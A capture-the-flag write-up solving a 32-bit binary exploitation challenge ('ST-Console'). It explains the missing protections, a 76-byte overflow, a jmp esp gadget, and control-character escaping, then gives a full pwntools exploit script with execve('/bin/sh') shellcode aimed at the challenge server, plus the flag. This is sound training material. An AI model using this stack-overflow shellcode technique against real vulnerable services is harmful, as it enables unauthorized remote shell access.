# ST-Console Writeup

## Challenge Information

- **Name**: ST-Console
- **Category**: Pwn / Binary Exploitation
- **Points:** 100

![](attachments/Pasted%20image%2020251130131301.png)

## Analysis

We are provided with a 32-bit ELF executable named `shellpwn`. Running `checksec` on the binary reveals the following security properties:

```text
Arch:       i386-32-little
RELRO:      No RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing (Stack: Executable)
PIE:        No PIE (0x8048000)
```

Key takeaways:

- **No Canary**: We can overflow the buffer without worrying about a stack cookie.
- **No PIE**: The code segment is loaded at a fixed address, making gadget discovery easier.
- **Executable Stack**: We can place shellcode on the stack and execute it.

## Vulnerability

The binary contains a buffer overflow vulnerability. However, interaction with the binary suggests that it filters or specially handles control characters. This requires us to "escape" our payload to ensure it reaches the buffer intact.

## Exploitation Strategy

1.  **Determine Offset**: The offset to the return address (EIP) is identified as 76 bytes.
2.  **Find Gadget**: Since the stack is executable and ASLR/PIE is not an issue for the code segment, we can use a `jmp esp` gadget to redirect execution flow to our shellcode located on the stack.
    - `jmp esp` address: `0x080491c3`
3.  **Construct Payload**:
    - **Padding**: 76 bytes of junk ('A's).
    - **Return Address**: Overwrite EIP with the address of `jmp esp`.
    - **NOP Sled**: A sequence of NOPs (`\x90`) to ensure safe entry into the shellcode.
    - **Shellcode**: Standard x86 `execve("/bin/sh")` shellcode.
4.  **Bypass Input Filtering**: The exploit script reveals that bytes less than `0x20` or equal to `0x7f` must be escaped using `0x16`.

## Solution Script

The following Python script implements the exploit:

```python
from pwn import *
import sys

# Context
context.binary = './shellpwn'
context.log_level = 'debug'

# Connection
host = '38.60.200.116'
port = 9005

p = remote(host, port)

# Gadget
jmp_esp = 0x080491c3

# Shellcode
# x86 execve("/bin/sh")
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

# Payload
offset = 76
raw_payload = b"A" * offset
raw_payload += p32(jmp_esp)
raw_payload += b"\x90" * 32 # NOP sled
raw_payload += shellcode

# Escape payload
# Use 0x16 (SYN/LNEXT) to quote control characters
payload = b""
for byte in raw_payload:
    if byte < 0x20 or byte == 0x7f:
        payload += b"\x16" + bytes([byte])
    else:
        payload += bytes([byte])


# Send
p.recvuntil(b"Submit diagnostic notes:")
p.sendline(payload)


# Interactive
p.interactive()
```
## Flag

```NOVA_CTF{y0u_g0t_th3_fl4g_by_1nj3ct1ng_5h3llc0d3}```


![](attachments/Pasted%20image%2020251130163919.png)


![](attachments/Pasted%20image%2020251130163931.png)

